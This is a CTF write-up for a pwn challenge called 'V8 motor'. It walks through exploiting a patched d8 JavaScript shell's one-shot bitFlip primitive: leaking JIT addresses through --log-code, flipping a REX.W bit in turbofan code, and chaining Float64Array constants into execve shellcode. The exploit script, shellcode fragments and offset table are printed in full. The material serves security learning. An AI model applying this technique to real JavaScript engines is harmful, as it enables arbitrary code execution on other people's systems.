# V8 motor

| | |
|---|---|
| Event | The Few Chosen CTF 2026 |
| Category | pwn |
| Difficulty | grandpa |
| Author | minipif |
| Points at close | 181 |
| Solves | 84 |
| Status | solved |

> the sun is a deadly laser

Files: [`motor_v8.zip`](handout/motor_v8.zip)

<details>
<summary><b>Solution</b></summary>

The guard on the added `bitFlip` primitive asks one question, whether the byte it is about to touch lies inside the V8 sandbox, and it never asks how far the offset had to travel to get there. The offset is a JavaScript number capped only at `2^53-1`, the JIT CodeRange is a 512 MB read-write-execute mapping some 91 TB away from the heap cage, and the service starts `d8` with `--log-code`, so the program can read its own absolute code addresses out of `d8.log.getAndStop()`. Anchor on `Object.prototype`, walk the offset out to a turbofan function, and one permitted flip lands in executable JIT code. The second idea, that clearing the REX.W bit of a `movabs r10, imm64` turns nine `Float64Array` constants into a shellcode chain, follows from the first and is derivable once you accept that you can write one bit anywhere in the CodeRange.

## Recon, in the order it ran

```
$ unzip -l handout/motor_v8.zip
$ file scratch/x/d8
$ (cd scratch/x && ./d8 --version)
V8 version 15.4.0 (candidate)
```

A 50 MB custom `d8`, its `snapshot_blob.bin`, a `bitflip.patch`, a `readflag.c`, a Dockerfile, and a `run.sh`. Read the last three before the patch, because they say what winning looks like.

```
$ grep -A5 'chown root' scratch/x/Dockerfile
$ tail -5 scratch/x/run.sh
timeout 90s /challenge/d8 --log-code --logfile=+ "${exp_file}"
```

The flag is mode `0400` owned by root. Only `/rdflag`, a setuid binary, accesses files with those permissions. A memory disclosure primitive would be worthless; the win condition is running a program. `run.sh` reads a length, then exactly that many bytes, writes them to a temporary file, and gives the file to `d8` under a 90 second timeout. Each connection is one JavaScript file and one process. The `--log-code` on that command line looked at first like the author being tidy about logging; it turns out to be the leak.

![a custom d8 15.4.0, a patch file, and the Dockerfile](media/01-setup-handout.png)

## The patch, read for what it removes as well as what it adds

```
$ sed -n '/void Shell::BitFlip/,/^+}/p' scratch/x/bitflip.patch
```

The addition is one global function. It takes an object and a bit offset, computes `target = object->address() + bit_offset / 8`, refuses when the isolate's sandbox contains `target`, and otherwise XORs one bit into that byte. The argument validation insists on a finite non-negative integer no larger than `9007199254740991`, which is `2^53-1`.

Three deletions in the same patch are as informative as the addition. It removes `os.system` and the flag that enables it, it removes the WebAssembly serializer from the `d8` template, and it removes `enable_os_system` from the options struct entirely. Those are the two shortcuts a CTF player reaches for first in a `d8` challenge, and closing both says the author intends the flip to be the way through.

The interesting line is the order of operations at the top of the function.

```cpp
static std::atomic_flag used = ATOMIC_FLAG_INIT;
bool already_used = used.test_and_set();
```

The flag is tested and set before any argument is validated and before the sandbox check runs, so a rejected call has already consumed the one shot and the second call throws `used` no matter what it was going to do. Confirm that locally rather than assuming it, because the difference decides whether the remote strategy can include probing at all.

```
$ scratch/x/d8 scratch/shots/guard.js
  bitFlip(o, 0)     -> throws "invalid"   (o is a normal object, so it is inside the sandbox)
  bitFlip(o, 8)     -> throws "used"      (the rejected call above already burned the shot)
  typeof os         -> undefined
  typeof d8.wasm    -> undefined
```

![bitflip.patch adds one primitive, one shot, sandbox-excluded](media/02-recon-bitflip-patch.png)

Probing and retrying are both off the table on the remote instance; every address the exploit needs must be computed inside the same script that spends the flip, and the script also must pick its own target blindly.

## The leak the service turned on for you

The sandbox check compares `target` with the sandbox range, so a legal target has to live outside the pointer-compression cage, and finding such a target means learning a real address from inside JavaScript. `--log-code` is already on the command line and `d8.log.getAndStop()` returns the log as a string, so the early probes in `scratch/js` do nothing more than warm a function and read the log back.

```js
function f(a){return a*2;}
for (let i=0;i<100000;i++) f(i);
var log = d8.log.getAndStop();
print(log.slice(0, 3000));
```

Two row types in that log provide absolute addresses. A `new,MemoryChunk` row gives a heap chunk address, and taking the modal high dword across all of them recovers the pointer-compression cage base; a single row should not be trusted for instance, since the log also records chunks that belong elsewhere. A `code-creation,JS,<tier>` row gives the absolute entry address of a compiled function, with tier 10 for the interpreter, 11 for sparkplug, 12 for maglev, and 13 for turbofan. Tiers 12 and 13 sit at `0x55xx` addresses while the heap sits in the cage, which is the whole leak.

```
$ ./d8 --log-code --logfile=+ scratch/r/probe.js
new,CodeRange,0x563dc9240000,0
code-creation,JS,12,22691,0x563dc92412c0,688,sprayT ...
code-creation,JS,13,45794,0x563dc9243fc0,504,sprayT ...
```

`scratch/r/probe.js` prints those rows and then spins for 25 seconds so the process is still alive to be inspected, and `scratch/r/dump.sh` waits for the sentinel, copies `/proc/<pid>/maps`, and dumps 4 MB of the first `rwxp` mapping out of `/proc/<pid>/mem`. The maps file settles the sandbox question directly, since the RWX CodeRange and the cage are hundreds of gigabytes apart and only one of them is inside the sandbox.

![--log-code plus d8.log.getAndStop() gives absolute addresses](media/03-recon-address-leak.png)

`Object.prototype` sits at `cage + 0x1006840`, which makes it a convenient anchor at a fixed offset, requiring neither setup nor heap grooming, and the distance from there to a turbofan function works out at about 91 TB. Multiplying by eight gives a bit offset of roughly `7.3e14`, comfortably under the `2^53-1` ceiling the patch enforces and comfortably outside the sandbox, so the call is accepted; any object would serve as the anchor, and `Object.prototype` is simply the one that requires none.

## One bit in JIT code, and the REX.W target

Turbofan compiles a `Float64Array` store of a literal constant into a `movabs r10, imm64`, which encodes as `49 ba` followed by eight bytes of immediate. The prefix `0x49` is REX.W plus REX.B. Clear bit 3 and it becomes `0x41`, REX.B alone, so the instruction is now `mov r10d, imm32`, six bytes long instead of ten, and the four high bytes of every immediate in the function fall through into the instruction stream and execute.

The dump makes that checkable instead of theoretical. `scratch/shots/rexflip.py` loads the raw CodeRange bytes, disassembles the turbofan entry with capstone, applies the same one-bit XOR in Python, and disassembles again.

```
$ python scratch/shots/rexflip.py
BEFORE  +82  49bab0f5...  movabs  r10, 0x...      <- flip target
AFTER   +82  41ba...      mov     r10d, 0x...
        +88  4831f6       xor     rsi, rsi
        ...                                       <- execve("/rdflag", argv, NULL)
```

![clearing one REX.W bit turns nine JIT constants into a chain](media/04-insight-rexw-flip.png)

Each constant therefore holds six usable bytes plus a two-byte tail, and the tail is an `eb rel` short jump to the next constant's immediate, so the nine constants form a chain through the gaps that turbofan leaves between them. The eight fragments fit in six bytes each with `nop` padding, and they build the `execve` arguments on the stack before the final syscall.

```
4831f6 4831d2          xor rsi,rsi ; xor rdx,rdx
56 68 <hi>             push rsi ; push the high 4 bytes of "/rdflag\0"
b8 <lo> 90             mov eax, the low 4 bytes
894424fc 9090          mov [rsp-4], eax
488d7c24fc 90          lea rdi, [rsp-4]
4883ec20 9090          sub rsp, 0x20
5657 4889e6 90         push rsi ; push rdi ; mov rsi, rsp
6a3b 58 0f05 90        push 0x3b ; pop rax ; syscall
```

The generator packs each of those into an IEEE double and asserts both that the result is finite and that the nine constants stay distinct, since a repeated constant would be folded into a single `movabs` and break the chain.

The distances between the `movabs` instructions were read out of the dump, not derived on paper.

```python
TURBO_OFFS = [82, 116, 151, 186, 221, 256, 291, 326, 360]
```

Each `eb rel` is computed from that table, and `build()` asserts every relative jump is positive and under 128, so a wrong offset table fails at generation time instead of on the wire, where the only symptom would be a dead connection and a spent shot.

## Spending the shot

The generated script warms both a turbofan and a maglev copy of the spray function for at least 500,000 iterations and 2.5 seconds, waits a further 1.2 seconds for the log to settle, then reads the log once. It prefers the turbofan row and falls back to the maglev row with its own separate offset table, because tier-up is not guaranteed inside a fixed time budget and a run that never reaches turbofan would otherwise waste the connection. Then it computes the anchor, computes the offset, and spends the flip.

```js
const target = chosen[0];
const obj = cage + 0x1006840;
bitFlip(Object.prototype, (target - obj) * 8 + 3);
chosen[1](fa);
print("shellcode did not run (" + chosen[2] + ")");
```

Re-entering the sprayer after the flip is what executes the modified code. A third argument to `gen2.py` emits a variant that prints the cage base, the target, and the tier instead of flipping, so the arithmetic can be checked on a live process with the shot still unspent.

![from log text to one legal bit offset](media/05-exploit-leak-to-flip.png)

Verification used `/bin/ls` in place of `/rdflag` against a container rebuilt from the handout Dockerfile.

```
$ python scratch/r/gen2.py /bin/ls scratch/shots/exp_ls.js
$ python scratch/shots/local_solve.py 127.0.0.1 41337 scratch/shots/exp_ls.js
```

![one bitFlip, then re-enter the JIT function](media/06-exploit-arbitrary-exec.png)

Swap the path back to `/rdflag`, point [`solve/solve.py`](solve/solve.py) at the live instance over TLS on port 1337, and the setuid helper prints the flag.

## Dead ends

The scariest looking failure on the way in was an `ILL_ILLOPN` signal from the sandboxed `d8`. `execve` called a nonexistent path (the local rebuild lacked `/rdflag` at that point). The illegal-operand report is what the process does after the syscall returns rather than a sign the shellcode was wrong. Testing with `/bin/ls` instead of a missing path is the cheap way to tell the two apart. The test should be done before any time is spent re-reading the encoder.

The maglev path also cost real effort and never paid. Its instruction stride is regular, e.g. a first `movabs` at 74 with a constant stride of 55, so the table is easier to write than the turbofan one, but a warm run reliably reaches tier 13 and the maglev branch has stayed a fallback that never fires. It stays in the generator because the cost of keeping it is one extra table.

The removed `os.system` and the removed WebAssembly serializer both report `undefined` and were deleted in the same patch that added the primitive.

![the setuid helper runs](media/07-flag.png)
Flag: `TFCCTF{dacia_logan_motor_v8_vroom_vroom_cfb841a}`
</details>
